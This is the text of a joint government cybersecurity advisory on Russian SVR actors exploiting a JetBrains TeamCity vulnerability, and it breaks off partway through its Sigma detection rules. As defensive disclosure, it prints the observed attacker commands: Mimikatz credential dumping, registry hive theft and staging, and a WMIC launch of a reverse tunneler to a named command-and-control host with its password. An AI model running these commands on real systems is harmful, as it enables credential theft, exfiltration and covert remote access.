flags as unusual activity due to logging in from a remote location on a weekend however
could be responding to an emergency network problem). Include manual procedures to
confirm the legitimacy of these actions before determining how to respond. For example, if
the activity includes setting up new accounts or changing privileges a first step would be to
determine if there are indications that this may be a malicious insider attack versus
preparing for the startup of a new program.
Identity and Access Management: Recommended Best Practices for Administrators
 Monitor general user behaviors in both good and bad terms such as how many
successful access attempts versus unsuccessful, what hours typically worked, whether
remote access allowed, what systems accessed and amounts of data downloaded.
 Monitor activity between applications and systems and associated network traffic for
changes in connectivity, level of activity, and types of data. If an attacker is attempting to
move laterally within your network, this may include accesses and traffic that are unusual.
 Monitor external traffic that may include new interactions with previously unknown
sites or different types and levels of interactions. Remember that data exfiltration attacks
may be 
low and slow
 so a change may be small, but ongoing. Be careful to not include this
in an accepted baseline of activity.
TLP:CLEAR
Co-Authored by:
Product ID: AA23-347A
December 13, 2023
Russian Foreign Intelligence Service (SVR)
Exploiting JetBrains TeamCity CVE Globally
SUMMARY
The U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency
(CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW),
CERT Polska (CERT.PL), and the UK
s National Cyber Security Centre (NCSC) assess Russian
Foreign Intelligence Service (SVR) cyber actors
also known as Advanced Persistent Threat 29 (APT
29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard
are exploiting CVE-2023-42793 at a
large scale, targeting servers hosting JetBrains TeamCity software since September 2023.
Software developers use TeamCity software to manage and automate software compilation, building,
testing, and releasing. If compromised, access to a TeamCity server would provide malicious actors
with access to that software developer
s source code, signing certificates, and the ability to subvert
software compilation and deployment processes
access a malicious actor could further use to
conduct supply chain operations. Although the SVR used such access to compromise SolarWinds
and its customers in 2020, limited number and seemingly opportunistic types of victims currently
identified, indicate that the SVR has not used the access afforded by the TeamCity CVE in a similar
manner. The SVR has, however, been observed using the initial access gleaned by exploiting the
TeamCity CVE to escalate its privileges, move laterally, deploy additional backdoors, and take other
steps to ensure persistent and long-term access to the compromised network environments.
To bring Russia
s actions to public attention, the authoring agencies are providing information on the
s most recent compromise to aid organizations in conducting their own investigations and
securing their networks, provide compromised entities with actionable indicators of compromise
(IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR
malicious actions. The authoring agencies recommend all organizations with affected systems that
did not immediately apply available patches or workarounds to assume compromise and initiate threat
hunting activities using the IOCs provided in this CSA. If potential compromise is detected,
administrators should apply the incident response recommendations included in this CSA and report
key findings to the FBI and CISA.
U.S. organizations: To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory,
contact your local FBI field office or CISA
s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870. When available,
please include the following information regarding the incident: date, time, and location of the incident; type of activity;
number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and
a designated point of contact. SLTT organizations should report incidents to MS-ISAC (866-787-4722 or
SOC@cisecurity.org).
This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries
minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to
standard copyright rules, TLP:CLEAR information may be distributed without restrictions. For more information on the Traffic
Light Protocol, see cisa.gov/tlp/.
TLP:CLEAR
International Partnership
For a downloadable copy of IOCs, see:
AA23-347A (STIX XML, 77KB)
AA23-347A (STIX JSON, 70KB)
THREAT OVERVIEW
SVR cyber operations pose a persistent threat to public and private organizations
 networks globally.
Since 2013, cybersecurity companies and governments have reported on SVR operations targeting
victim networks to steal confidential and proprietary information. A decade later, the authoring
agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of,
foreign intelligence, a broad concept that for Russia encompasses information on the politics,
economics, and military of foreign states; science and technology; and foreign counterintelligence.
The SVR also conducts cyber operations targeting technology companies that enable future cyber
operations.
A decade ago, public reports about SVR cyber activity focused largely on the SVR
s spearphishing
operations, targeting government agencies, think tanks and policy analysis organizations, educational
institutions, and political organizations. This category of targeting is consistent with the SVR
responsibility to collect political intelligence, the collection of which has long been the SVR
s highest
priority. For the Russian Government, political intelligence includes not only the development and
execution of foreign policies, but also the development and execution of domestic policies and the
political processes that drive them. In December 2016, the U.S. Government published a Joint
Analysis Report titled 
GRIZZLY STEPPE 
 Russian Malicious Cyber Activity,
 which describes the
s compromise of a U.S. political party leading up to a presidential election. The SVR
s use of
spear phishing operations are visible today in its ongoing Diplomatic Orbiter campaign, primarily
targeting diplomatic agencies. In 2023, SKW and CERT.PL published a Joint Analysis Report
describing tools and techniques used by the SVR to target embassies in dozens of countries.
Less frequently, reporting on SVR cyber activity has addressed other aspects of the SVR
s foreign
intelligence collection mission. In July 2020, U.S., U.K., and Canadian Governments jointly published
an advisory revealing the SVR
s exploitation of CVEs to gain initial access to networks, and its
deployment of custom malware known as WellMess, WellMail, and Sorefang to target organizations
involved in COVID-19 vaccine development. Although not listed in the 2020 advisory, the authoring
agencies can now disclose that the SVR
s WellMess campaign also targeted energy companies.
Such biomedical and energy targets are consistent with the SVR
s responsibility to support the
Russian economy by pursuing two categories of foreign intelligence known as economic intelligence
and science and technology.
In April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds
information technology company and its customers to the SVR. This attribution marked the discovery
that the SVR had, since at least 2018, expanded the range of its cyber operations to include the
widespread targeting of information technology companies. At least some of this targeting was aimed
at enabling additional cyber operations. Following this attribution, the U.S. and U.K. Governments
published advisories highlighting additional SVR TTPs, including its exploitation of various CVEs, the
Page 2 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
s use of 
low and slow
 password spraying techniques to gain initial access to some victims
networks, exploitation of a zero-day exploit, and exploitation of Microsoft 365 cloud environments.
In this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably
continues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a
software development program, the authoring agencies assess the SVR could benefit from access to
victims, particularly by allowing the threat actors to compromise the networks of dozens of software
developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR
operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring
agencies assess the SVR has not yet used its accesses to software developers to access customer
networks and is likely still in the preparatory phase of its operation, having access to these
companies
 networks presents the SVR with opportunities to enable hard-to- detect command and
control (C2) infrastructure.
TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK
 for Enterprise framework, version 14. See the MITRE
ATT&CK Tactics and Techniques section for a table of the threat actors
 activity mapped to MITRE
ATT&CK
 tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE
ATT&CK framework, see CISA and MITRE ATT&CK
s Best Practices for MITRE ATT&CK Mapping
and CISA
s Decider Tool. While SVR followed a similar playbook in each compromise, they also
adjusted to each operating environment and not all presented steps or actions below were executed
on every host.
Initial Access - Exploitation
The SVR started to exploit Internet-connected JetBrains TeamCity servers [T1190] in late September
2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for
bypassing authorization, resulting in arbitrary code execution on the server. The authoring agencies
observations show that the TeamCity exploitation usually resulted in code execution [T1203] with high
privileges granting the SVR an advantageous foothold in the network environment. The authoring
agencies are not currently aware of any other initial access vector to JetBrains TeamCity currently
being exploited by the SVR.
Host Reconnaissance
Initial observations show the SVR used the following basic, built-in commands to perform host
reconnaissance [T1033],[T1059.003],[T1592.002]:
whoami /priv
whoami /all
whoami /groups
whoami /domain
nltest -dclist
nltest -dsgetdc
tasklist
netstat
Page 3 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
wmic /node:""<redacted>"" /user:""<redacted>"" /password:""<redacted>"" process list brief
wmic /node:""<redacted>"" process list brief
wmic process get commandline -all
wmic process <proc_id> get commandline
wmic process where name=""GoogleCrashHandler64.exe"" get commandline,processed
powershell ([adsisearcher]"((samaccountname=<redacted>))").Findall().Properties
powershell ([adsisearcher]"((samaccountname=<redacted>))").Findall().Properties.memberof
powershell Get-WmiObject -Class Win32_Service -Computername
powershell Get-WindowsDriver -Online -All
File Exfiltration
Additionally, the authoring agencies have observed the SVR exfiltrating files [T1041] which may
provide insight into the host system
s operating system:
C:\Windows\system32\ntoskrnl.exe to precisely identify system version, likely as a prerequisite
to deploy EDRSandBlast.
 SQL Server executable files - based on the review of the post exploitation actions, the SVR
showed an interest in specific files of the SQL Server installed on the compromised systems:
 C:\Program Files\Microsoft SQL
Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlmin.dll,
 C:\Program Files\Microsoft SQL
Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllos.dll,
 C:\Program Files\Microsoft SQL
Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllang.dll,
 C:\Program Files\Microsoft SQL
Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqltses.dll
 C:\Program Files\Microsoft SQL
Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\secforwarder.dll
 Visual Studio files 
 based on the review of the post exploitation actions, the SVR showed an
interest in specific files of the Visual Studio:
 C:\Program Files (x86)\Microsoft Visual
Studio\2017\SQL\Common7\IDE\VSIXAutoUpdate.exe
 Update management agent files 
 based on the review of the post exploitation actions, the
SVR showed an interest in executables and configuration of patch management software:
o C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd\bin\httpd.exe
o C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd
o C:\ProgramData\GFI\LanGuard 12\HttpdConfig\httpd.conf
Interest in SQL Server
Based on the review of the exploitation, the SVR also showed an interest in details of the SQL Server
[T1059.001],[T1505.001]:
powershell Compress-Archive -Path "C:\Program Files\Microsoft SQL
Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlmin.dll","C:\Program Files\Microsoft SQL
Page 4 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllos.dll","C:\Program Files\Microsoft SQL
Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllang.dll","C:\Program Files\Microsoft SQL
Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqltses.dll" -DestinationPath
C:\Windows\temp\1\sql.zip
SVR cyber actors also exfiltrated secforwarder.dll
Tactics Used to Avoid Detection
To avoid detection, the SVR used a 
Bring Your Own Vulnerable Driver
 [T1068] technique to disable
or outright kill endpoint detection and response (EDR) and antivirus (AV) software [T1562.001].
This was done using an open source project called 
EDRSandBlast.
 The authoring agencies have
observed the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is
used for controlling and protecting running processes and protecting them from infection. The actors
then inject code into AV/EDR processes for a small subset of victims [T1068]. Additionally,
executables that are likely to be detected (i.e. Mimikatz) were executed in memory [T1003.001].
In several cases, SVR attempted to hide their backdoors via:
Abusing a DLL hijacking vulnerability in Zabbix software by replacing a legitimate Zabbix DLL
with their one containing GraphicalProton backdoor,
Backdooring an open source application developed by Microsoft named vcperf. SVR modified
and copied publicly available source code. After execution, backdoored vcperf dropped
several DLLs to disc, one of those being a GraphicalProton backdoor,
Abusing a DLL hijacking vulnerability in Webroot antivirus software by replacing a legitimate
DLL with one containing GraphicalProton backdoor.
To avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft
OneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware
via OneDrive and Dropbox were hidden inside randomly generated BMP files [T1564], illustrated
below:
Privilege Escalation
To facilitate privilege escalation [T1098], the SVR used multiple techniques, including WinPEAS,
NoLMHash registry key modification, and the Mimikatz tool.
The SVR modified the NoLMHash registry using the following reg command:
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v NoLMHash /t
REG_DWORD /d "0" /f
Page 5 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
The SVR used the following Mimikatz commands [T1003]:
privilege::debug
lsadump::cache
lsadump::secrets
lsadump::sam
sekurlsa::logonpasswords
Persistence
The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors.
Depending on the privileges the SVR had, their executables were stored in one of following
directories:
C:\Windows\temp
C:\Windows\System32
C:\Windows\WinStore
The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of
arguments passed to schtasks.exe, which can be found in Appendix B 
 Indicators of
Compromise.
To secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket
Granting Tickets (TGTs) [T1558.001].
Sensitive Data Exfiltration [T1020]
The SVR exfiltrated the following Windows Registry hives from its victims [T1003]:
HKLM\SYSTEM
HKLM\SAM
HKLM\SECURITY
In order to exfiltrate Windows Registry, the SVR saved hives into files [T1003.002], packed them, and
then exfiltrated them using a backdoor capability. it used 
reg save
 to save SYSTEM, SAM and
SECURITY registry hives, and used powershell to stage .zip archives in the C:\Windows\Temp\
directory.
reg save HKLM\SYSTEM ""C:\Windows\temp\1\sy.sa"" /y
reg save HKLM\SAM ""C:\Windows\temp\1\sam.sa"" /y
reg save HKLM\SECURITY ""C:\Windows\temp\1\se.sa"" /y
powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath
C:\Windows\temp\s.zip -Force & del C:\Windows\temp\1 /F /Q
In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such
as session cookies, browsing history, or saved logins.
SVR also used DSInternals open source tool to interact with Directory Services. DSInternals allows to
obtain a sensitive Domain information.
Network Reconnaissance
Page 6 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
After the SVR built a secure foothold and gained an awareness of a victim
s TeamCity server, it then
focused on network reconnaissance [T1590.004]. The SVR performed network reconnaissance using
a mix of built-in commands and additional tools, such as port scanner and PowerSploit, which it
launched into memory [T1046]. The SVR executed the following PowerSploit commands:
Get-NetComputer
Get-NetGroup
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description,
pwdlastset, logoncount, badpwdcount"
Get-NetDiDomain
Get-AdUser
Get-DomainUser -UserName
Get-NetUser -PreauthNotRequire
Get-NetComputer | select samaccountname
Get-NetUser -SPN | select serviceprincipalname
Tunneling into Compromised Environments
In selected environments the SVR used an additional tool named, 
rr.exe
a modified open source
reverse socks tunneler named Rsockstun
to establish a tunnel to the C2 infrastructure [T1572].
The authoring agencies are aware of the following infrastructure used in conjunction with 
rr.exe
65.20.97[.]203:443
Poetpages[.]com:8443
The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation
Command Line (WMIC) [T1047] utility after dropping it to disk:
wmic process call create "C:\Program Files\Windows Defender Advanced Threat
Protection\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31"
Lateral Movement
The SVR used WMIC to facilitate lateral movement [T1047],[T1210].
wmic /node:""<redacted>"" /user:""<redacted>" /password:""<redacted>"" process call create
""rundll32 C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost""
The SVR also modified DisableRestrictedAdmin key to enable remote connections [T1210].
It modified Registry using the following reg command:
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v
DisableRestrictedAdmin /t REG_DWORD /d "0" /f
Adversary Toolset
In the course of the TeamCity operation, the SVR used multiple custom and open source available
tools and backdoors. The following custom tools were observed in use during the operation:
Page 7 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
GraphicalProton is a simplistic backdoor that uses OneDrive, Dropbox, and randomly
generated BMPs [T1027.001] to exchange data with the SVR operator.
After execution, GraphicalProton gathers environment information such as active TCP/UDP
connections [T1049], running processes [T1049], as well as user, host, and domain names
[T1590]. OneDrive is used as a primary communication channel while Dropbox is treated as a
backup channel [T1567]. API keys are hardcoded into the malware. When communicating with
cloud services, GraphicalProton generates a randomly named directory which is used to store
infection-specific BMP files - with both commands and results [T1564.001]. Directory name is
re-randomized each time the GraphicalProton process is started.
BMP files that were used to exchange data were generated in the following way:
1. Compress data using zlib,
2. Encrypt data using custom algorithm,
3. Add 
 string literal to encrypted data,
4. Create a random BMP with random rectangle,
5. And finally, encode encrypted data within lower pixel bits.
While the GraphicalProton backdoor has remained mostly unchanged over the months we have been
tracking it, to avoid detection the adversary wrapped the tool in various different layers of obfuscation,
encryption, encoders, and stagers. Two specific variants of GraphicalProton 
packaging
 are
especially noteworthy 
 a variant that uses DLL hijacking [T1574.002] in Zabbix as a means to start
execution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself
within vcperf [T1036], an open-source C++ build analysis tool from Microsoft.
GraphicalProton HTTPS variant 
 a variant of GraphicalProton backdoor recently introduced
by the SVR that forgoes using cloud-based services as a C2 channel and instead relies on
HTTP request.
To legitimize the C2 channel, SVR used a re-registered expired domain set up with dummy
WordPress website. Execution of HTTPS variant of GraphicalProton is split into two files 
stager and encrypted binary file that contains further code.
MITRE ATT&CK TACTICS AND TECHNIQUES
See below tables for all referenced threat actor tactics and techniques in this advisory. For additional
mitigations, see the Mitigations section.
Table 1: SVR Cyber Actors ATT&CK Techniques for Enterprise - Reconnaissance
Technique Title
Gather Victim Network
Information: Network Topology
T1590.004
SVR cyber actors may gather
information about the victim
network topology that can be used
during targeting.
Page 8 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
Gather Victim Host Information:
Software
T1592.002
SVR cyber actors may gather
information about the victim
s host
networks that can be used during
targeting.
Table 2: SVR Cyber Actors
 ATT&CK Techniques for Enterprise 
 Initial Access
Technique Title
Exploit Public-Facing Application
T1190
SVR cyber actors exploit internetconnected JetBrains TeamCity server
using CVE-2023-42793 for initial
access.
Table 3: SVR Cyber Actors
 ATT&CK Techniques for Enterprise: Execution
Technique Title
Command and Scripting
Interpreter: PowerShell
T1059.001
SVR cyber actors used powershell
commands to compress Microsoft
SQL server .dll files.
Command and Scripting
Interpreter: Windows Command
Shell
T1059.003
SVR cyber actors execute these
powershell commands to perform
host reconnaissance:
 powershell
([adsisearcher]"((samaccountn
ame=<redacted>))").Findall().P
roperties
 powershell
([adsisearcher]"((samaccountn
ame=<redacted>))").Findall().P
roperties.memberof
 powershell Get-WmiObject Class Win32_Service Computername
 powershell Get-WindowsDriver
-Online -All
Exploitation for Client Execution
T1203
SVR cyber actors leverage arbitrary
code execution after exploiting CVE2023-42793.
Page 9 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
Hijack Execution Flow: DLL
Side-Loading
T1574.002
SVR cyber actors use a variant of
GraphicalProton that uses DLL
hijacking in Zabbix as a means to
start execution.
Table 4: SVR Cyber Actors
 ATT&CK Techniques for Enterprise: Persistence
Technique Title
Scheduled Task
T1053.005
SVR cyber actors may abuse
Windows Task Schedule to perform
task scheduling for initial or recurring
execution of malicious code.
Server Software Component:
SQL Stored Procedures
T1505.001
SVR cyber actors abuse SQL server
stored procedures to maintain
persistence.
Boot or Logon Autostart
Execution
T1547
SVR cyber actors used
C:\Windows\system32\ntoskrnl.exe
to configure automatic system boot
settings to maintain persistence.
Table 5: SVR Cyber Actors
 ATT&CK Techniques for Enterprise: Privilege Escalation
Technique Title
Exploitation for Privilege
Escalation
T1068
SVR cyber actors exploit JetBrains
TeamCity vulnerability to achieve
escalated privileges.
To avoid detection, the SVR cyber
actors used a 
Bring Your Own
Vulnerable Driver
 technique to
disable EDR and AV defense
mechanisms.
Account Manipulation
T1098
SVR cyber actors may manipulate
accounts to maintain and/or elevate
access to victim systems.
Page 10 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
Table 6: SVR Cyber Actors
 ATT&CK Techniques for Enterprise: Defense Evasion
Technique Title
Obfuscated Files or Information:
Binary Padding
T1027.001
SVR cyber actors use BMPs to
perform binary padding while
exchange data is exfiltrated to their
C2 station.
Masquerading
T1036
SVR cyber actors use a variant that
uses DLL hijacking in Zabbix as a
means to start execution (and
potentially provide long-term, hard-todetect access) and a variant that
masks itself within vcperf, an opensource C++ build analysis tool from
Microsoft.
Process Injection
T1055
SVR cyber actors inject code into AV
and EDR processes to evade
defenses.
Disable or Modify Tools
T1562.001
SVR cyber actors may modify and/or
disable tools to avoid possible
detection of their malware/tools and
activities.
Hide Artifacts
T1564
SVR cyber actors may attempt to
hide artifacts associated with their
behaviors to evade detection.
Hide Artifacts: Hidden Files and
Directories
T1564.001
When communicating with cloud
services, GraphicalProton generates
a randomly named directory which is
used to store infection-specific BMP
files - with both commands and
results.
Table 7: SVR Cyber actors
 ATT&CK Techniques for Enterprise: Credential Access
Technique Title
OS Credential Dumping: LSASS
Memory
T1003.001
SVR cyber actors executed Mimikatz
commands in memory to gain access
to credentials stored in memory.
Page 11 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
OS Credential Dumping: Security T1003.002
Account Manager
SVR cyber actors used:
privilege::debug
lsadump::cache
lsadump::secrets
lsadump::sam
sekurlsa::logonpasswords
Mimikatz commands to gain access
to credentials.
Additionally, SVR cyber actors
exfiltrated Windows registry hives to
steal credentials.
HKLM\SYSTEM
HKLM\SAM
HKLM\SECURITY
Credentials from Password
Stores: Credentials from Web
Browsers
T1555.003
In a few specific cases, the SVR
used the SharpChromium tool to
obtain sensitive browser data such as
session cookies, browsing history, or
saved logins.
Steal or Forge Kerberos Tickets:
Golden Ticket
T1558.001
To secure long-term access to the
environment, the SVR used the
Rubeus toolkit to craft Ticket
Granting Tickets (TGTs).
Table 8: SVR Cyber Actors ATT&CK Techniques for Enterprise: Discovery
Technique Title
System Owner/User Discovery
T1033
SVR cyber actors use these built-in
commands to perform host
reconnaissance: whoami /priv,
whoami / all, whoami / groups,
whoami / domain to perform user
discovery.
Network Service Discovery
T1046
SVR cyber actors performed
network reconnaissance using a
mix of built-in commands and
additional tools, such as port
scanner and PowerSploit.
Page 12 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
Process Discovery
T1057
SVR cyber actors use
GraphicalProton to gather running
processes data.
Gather Victim Network
Information
T1590
SVR cyber actors use
GraphicalProton to gather victim
network information.
Table 9: SVR Cyber Actors ATT&CK Techniques for Enterprise: Lateral Movement
Technique Title
Exploitation of Remote Services
T1210
SVR cyber actors may exploit remote
services to gain unauthorized access
to internal systems once inside a
network.
Windows Management
Instrumentation
T1047
SVR cyber actors executed
Rsockstun either in memory or
using Windows Management
Instrumentation (WMI) to execute
malicious commands and
payloads.
wmic process call create
"C:\Program Files\Windows
Defender Advanced Threat
Protection\Sense.exe -connect
poetpages.com -pass M5540sddsf2@34232fsl45t31"
Table 10: SVR Cyber Actors ATT&CK Techniques for Enterprise: Command and Control
Technique Title
Dynamic Resolution
T1568
SVR may dynamically establish
connections to command-and-control
infrastructure to evade common
detections and remediations.
Protocol Tunneling
T1572
SVR cyber actors may tunnel
network communications to and
from a victim system within a
separate protocol to avoid
detection/network filtering and/or
enable access to otherwise
unreachable systems.
Page 13 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
In selected environments, the SVR
used an additional tool named,
rr.exe
a modified open source
reverse socks tunneler named
Rsockstun
to establish a tunnel
to the C2 infrastructure.
Table 11: SVR Cyber Actors ATT&CK Techniques for Enterprise: Exfiltration
Technique Title
Automated Exfiltration
T1020
SVR cyber actors may exfiltrate data,
such as sensitive documents,
through the use of automated
processing after being gathered
during collection.
Exfiltration Over C2 Channel
T1041
SVR cyber actors may steal data
by exfiltrating it over an existing C2
channel. Stolen data is encoded
into normal communications using
the same protocol as C2
communications.
Exfiltration Over Web Service
T1567
SVR cyber actors use OneDrive
and Dropbox to exfiltrate data to
their C2 station.
INDICATORS OF COMPROMISE
Note: Please refer to Appendix B for a list of IOCs.
VICTIM TYPES
As a result of this latest SVR cyber activity, the FBI, CISA, NSA, SKW, CERT Polska, and NCSC
have identified a few dozen compromised companies in the United States, Europe, Asia, and
Australia, and are aware of over a hundred compromised devices though we assess this list does not
represent the full set of compromised organizations. Generally, the victim types do not fit into any sort
of pattern or trend, aside from having an unpatched, Internet-reachable JetBrains TeamCity server,
leading to the assessment that SVR
s exploitation of these victims
 networks was opportunistic in
nature and not necessarily a targeted attack. Identified victims included: an energy trade association;
companies that provide software for billing, medical devices, customer care, employee monitoring,
financial management, marketing, sales, and video games; as well as hosting companies, tools
manufacturers, and small and large IT companies.
Page 14 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
DETECTION METHODS
The following rules can be used to detect activity linked to adversary activity. These rules should
serve as examples and adapt to each organization
s environment and telemetry.
SIGMA rules
Presented SIGMA rules target identified operators
 behavior patterns and can be used for the threat
hunting against collected logs.
title: Privilege information listing via whoami
description: Detects whoami.exe execution and listing of privileges
author:
references: https://learn.microsoft.com/en-us/windows-server/administration/windowscommands/whoami
date: 2023/11/15
logsource:
category: process_creation
product: windows
detection:
selection:
Image|endswith:
- 'whoami.exe'
CommandLine|contains:
- 'priv'
- 'PRIV'
condition: selection
falsepositives: legitimate use by system administrator
title: DC listing via nltest
description: Detects nltest.exe execution and DC listing
author:
references:
date: 2023/11/15
logsource:
category: process_creation
product: windows
detection:
selection:
Image|endswith:
- 'nltest.exe'
CommandLine|re: '.*dclist\:.*|.*DCLIST\:.*|.*dsgetdc\:.*|.*DSGETDC\:.*'
condition: selection
falsepositives: legitimate use by system administrator
title: DLL execution via WMI
description: Detects DLL execution via WMI
author:
references:
date: 2023/11/15
Page 15 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
logsource:
category: process_creation
product: windows
detection:
selection:
Image|endswith:
- 'WMIC.exe'
CommandLine|contains|all:
- 'call'
- 'rundll32'
condition: selection
falsepositives: legitimate use by software or system administrator
title: Process with connect and pass as args
description: Process with connect and pass as args
author:
references:
date: 2023/11/15
logsource:
category: process_creation
product: windows
detection:
selection:
CommandLine|contains|all:
- 'pass'
- 'connect'
condition: selection
falsepositives: legitimate use of rsockstun or software with exact same arguments
title: Service or Drive enumeration via powershell
description: Service or Drive enumeration via powershell
author:
references:
date: 2023/11/15
logsource:
category: ps_script
product: windows
detection:
selection_1:
ScriptBlockText|contains|all:
- 'Get-WmiObject'
- '-Class'
- 'Win32_Service'
selection_2:
ScriptBlockText|contains|all:
- 'Get-WindowsDriver'
- '-Online'
- '-All'
condition: selection_1 or selection_2
Page 16 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
falsepositives: legitimate use by system administrator
title: Compressing files from temp to temp
description: Compressing files from temp\ to temp used by SVR to prepare data to be
exfiltrated
references:
author:
date: 2023/11/15
logsource:
category: ps_script
product: windows
detection:
selection:
ScriptBlockText|re: '.*Compress\-Archive.*Path.*Windows\\[Tt]{1}emp\\[19]{1}.*DestinationPath.*Windows\\[Tt]{1}emp\\.*'
condition: selection
title: DLL names used by SVR for GraphicalProton backdoor
description: Hunts for known SVR-specific DLL names.
references:
author:
date: 2023/11/15
logsource:
category: image_load
product: windows
detection:
selection:
ImageLoaded|endswith:
- 'AclNumsInvertHost.dll'
- 'ModeBitmapNumericAnimate.dll'
- 'UnregisterAncestorAppendAuto.dll'
- 'DeregisterSeekUsers.dll'
- 'ScrollbarHandleGet.dll'
- 'PerformanceCaptionApi.dll'
- 'WowIcmpRemoveReg.dll'
- 'BlendMonitorStringBuild.dll'
- 'HandleFrequencyAll.dll'
- 'HardSwapColor.dll'
- 'LengthInMemoryActivate.dll'
- 'ParametersNamesPopup.dll'
- 'ModeFolderSignMove.dll'
- 'ChildPaletteConnected.dll'
- 'AddressResourcesSpec.dll'
condition: selection
title: Sensitive registry entries saved to file
description: Sensitive registry entries saved to file
author:
references:
date: 2023/11/15
logsource:
Page 17 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
category: process_creation
product: windows
detection:
selection_base:
Image|endswith:
- 'reg.exe'
CommandLine|contains: 'save'
CommandLine|re: '.*HKLM\\SYSTEM.*|.*HKLM\\SECURITY.*|.*HKLM\\SAM.*'
selection_file:
CommandLine|re: '.*sy\.sa.*|.*sam\.sa.*|.*se\.sa.*'
condition: selection_base and selection_file
title: Scheduled tasks names used by SVR for GraphicalProton backdoor
description: Hunts for known SVR-specific scheduled task names
author:
references:
date: 2023/11/15
logsource:
category: taskscheduler
product: windows
detection:
selection:
EventID:
- 4698
- 4699
- 4702
TaskName:
- '\Microsoft\Windows\IISUpdateService'
- '\Microsoft\Windows\WindowsDefenderService'
- '\Microsoft\Windows\WindowsDefenderService2'
- '\Microsoft\DefenderService'
- '\Microsoft\Windows\DefenderUPDService'
- '\Microsoft\Windows\WiMSDFS'
- '\Microsoft\Windows\Application Experience\StartupAppTaskCkeck'
- '\Microsoft\Windows\Windows Error Reporting\SubmitReporting'
- '\Microsoft\Windows\Windows Defender\Defender Update Service'
- '\WindowUpdate'
- '\Microsoft\Windows\Windows Error Reporting\CheckReporting'
- '\Microsoft\Windows\Application Experience\StartupAppTaskCheck'
- '\Microsoft\Windows\Speech\SpeechModelInstallTask'
- '\Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStart'
- '\Microsoft\Windows\Data Integrity Scan\Data Integrity Update'
- '\Microsoft\Windows\WindowsUpdate\Scheduled AutoCheck'
- '\Microsoft\Windows\ATPUpd'
- '\Microsoft\Windows\Windows Defender\Service Update'
- '\Microsoft\Windows\WindowsUpdate\Scheduled Check'
- '\Microsoft\Windows\WindowsUpdate\Scheduled AutoCheck'
- '\Defender'
- '\defender'
- '\\Microsoft\\Windows\\IISUpdateService'
- '\\Microsoft\\Windows\\WindowsDefenderService'
Page 18 of 27 | Product ID: AA23-347A
TLP:CLEAR
TLP:CLEAR
International Partnership
- '\\Microsoft\\Windows\\WindowsDefenderService2'
- '\\Microsoft\\DefenderService'
- '\\Microsoft\\Windows\\DefenderUPDService'
- '\\Microsoft\\Windows\\WiMSDFS'
- '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCkeck'
